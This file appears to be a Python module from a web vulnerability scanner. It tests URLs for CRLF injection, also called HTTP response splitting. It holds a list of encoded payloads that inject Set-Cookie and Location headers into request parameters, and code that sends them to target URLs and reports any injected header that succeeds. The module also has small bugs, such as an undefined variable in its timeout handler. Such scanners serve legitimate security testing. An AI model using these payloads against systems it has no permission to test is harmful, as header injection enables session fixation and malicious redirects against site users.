from core.others import good,bad,info,requester,proxies,requests,multitest
RedirectCodes = [i for i in range(300,311,1)]
payloads = [
            r"%0d%0aLocation:www.google.com%0d%0a",
            r"%0d%0aSet-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;",
            r"%E5%98%8A%E5%98%8DLocation:www.google.com",
            r"\rSet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\rSet-Cookie:name=ch33ms;",
            r"%u000ASet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            r"%23%0D%0ALocation:www.google.com;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;",
            r"%5cr%5cnLocation:www.google.com",
            r"%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:name=ch33ms;",
            r"\r\n Header-Test:BLATRUC",
            r"\rSet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;"
            ]
#---------------------------------------------------------------------#
def CrlfScan(url,Foxy):
    result = multitest(url,payloads)
    if type(result) is tuple:
        for params in result[0]:
            TestingBreak = request(result[1],Foxy,params)
            if TestingBreak:
                break
    else:
        for url in result:
            TestingBreak = request(url,Foxy)
            if TestingBreak:
                break

def request(Uri,Foxy,Params='',PayloadIndex=0):
    skip = 1
    if Foxy:
        try:
            page = requester(Uri,True,Params)
        except requests.exceptions.Timeout:
            print("[\033[91mTimeout\033[00m] %s" % url)
            return skip
        except requests.exceptions.ConnectionError:
            print("%s Connection Error" % bad)
            return skip
    else:
        try:
            page = requester(Uri,False,Params)
        except requests.exceptions.Timeout:
            print("[\033[91mTimeout\033[00m] %s" % url)
            return skip
        except requests.exceptions.ConnectionError:
            print("%s Connection Error" % bad)
            return skip
        except IndexError:
            PayloadIndex = 0

    function_break = BasicChecks(page,payloads[PayloadIndex],page.request.url)
    PayloadIndex += 1
    if function_break:
        return skip  

def BasicChecks(PageVar,payload,url):
    skip = 1
    if 'Location' in payload and PageVar.status_code in RedirectCodes and PageVar.headers['Location'] == "www.google.com":
        print("%s HTTP Response Splitting found: \033[1m%s\033[00m" % (good, payload))
    elif "Set-Cookie" in payload:
        if PageVar.status_code != 404:
            try:
                if PageVar.headers['Set-Cookie'] == "name=ch33ms;":
                    print("%s HTTP Response Splitting found: \033[1m%s\033[00m" % (good, payload))
            except KeyError:
                return skip

    if PageVar.status_code==404:
        print("%s %s [\033[91m404\033[00m]" % (bad,url))
        
    elif PageVar.status_code==403:
        print("%s %s [\033[91m403\033[00m]" % (bad,url))
        
    elif PageVar.status_code==400:
        print("%s %s [\033[91m400\033[00m]" % (bad,url))

    else:
        print("%s Found nothing :: %s" % (bad,url))